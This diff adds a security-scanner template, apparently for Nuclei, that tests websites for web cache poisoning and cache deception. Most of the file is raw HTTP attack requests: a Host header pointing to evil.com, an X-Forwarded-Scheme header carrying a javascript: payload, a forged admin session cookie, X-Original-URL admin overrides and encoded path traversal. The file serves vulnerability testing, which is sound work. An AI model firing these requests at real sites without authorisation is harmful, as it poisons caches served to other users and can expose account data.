@@ -1,0 +1,143 @@
+id: web-cache-poisoning-real
+
+info:
+  name: Web Cache Poisoning with Exploitation Verification
+  author: geeknik
+  severity: high
+  description: |
+    Detects and exploits ACTUAL web cache poisoning vulnerabilities by injecting
+    headers and parameters that get cached and reflected to other users. Tests
+    multiple poisoning vectors including Host header injection, X-Forwarded headers,
+    and cache key manipulation.
+  reference:
+    - https://portswigger.net/research/web-cache-entanglement
+    - https://portswigger.net/research/practical-web-cache-poisoning
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:H/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-444,CWE-524
+  tags: cache,poisoning,injection,high
+
+variables:
+  poison_id: "{{randstr}}"
+  callback: "{{interactsh-url}}"
+  cache_buster: "{{rand_int(10000, 99999)}}"
+
+http:
+  # Test 1: Host header cache poisoning
+  - raw:
+      - |
+        GET /?cachebuster={{cache_buster}} HTTP/1.1
+        Host: {{callback}}.evil.com
+        X-Forwarded-Host: {{callback}}
+        X-Host: {{callback}}
+        X-Forwarded-Server: {{callback}}
+        X-HTTP-Host-Override: {{callback}}
+        Connection: close
+
+      - |
+        GET /?cachebuster={{cache_buster}} HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body_2, "{{callback}}") || contains(body_2, "evil.com")'
+
+  # Test 2: X-Forwarded-Scheme poisoning
+  - raw:
+      - |
+        GET /test{{cache_buster}} HTTP/1.1
+        Host: {{Hostname}}
+        X-Forwarded-Proto: http
+        X-Forwarded-Scheme: http://{{callback}}/xss
+        X-Forwarded-Protocol: javascript:alert(1)
+        Connection: close
+
+      - |
+        GET /test{{cache_buster}} HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body_2, "http://{{callback}}") || contains(body_2, "javascript:")'
+
+  # Test 3: Cache deception via path confusion
+  - raw:
+      - |
+        GET /account/settings/{{cache_buster}}.css HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: session=admin
+        Accept: text/css
+        Connection: close
+
+      - |
+        GET /account/settings/{{cache_buster}}.css HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body_2, "email") || contains(body_2, "password") || contains(body_2, "token")'
+
+  # Test 4: Fragment cache poisoning
+  - raw:
+      - |
+        GET /#{{callback}}/poison-{{poison_id}} HTTP/1.1
+        Host: {{Hostname}}
+        X-Original-URL: /admin
+        X-Rewrite-URL: /admin
+        Connection: close
+
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
+
+  # Test 5: Parameter pollution cache poisoning
+  - raw:
+      - |
+        GET /?param={{callback}}&cb={{cache_buster}} HTTP/1.1
+        Host: {{Hostname}}
+        X-HTTP-Method-Override: POST
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 50
+        Connection: close
+
+        utm_source={{callback}}&callback={{callback}}
+
+      - |
+        GET /?cb={{cache_buster}} HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body_2, "{{callback}}")'
+
+  # Test 6: Cache key normalization attack
+  - raw:
+      - |
+        GET /api/v1%2f..%2f..%2fadmin?cb={{cache_buster}} HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+
+    matchers:
+      - type: word
+        words:
+          - "admin"
+          - "dashboard"
+          - "unauthorized"
+        condition: or
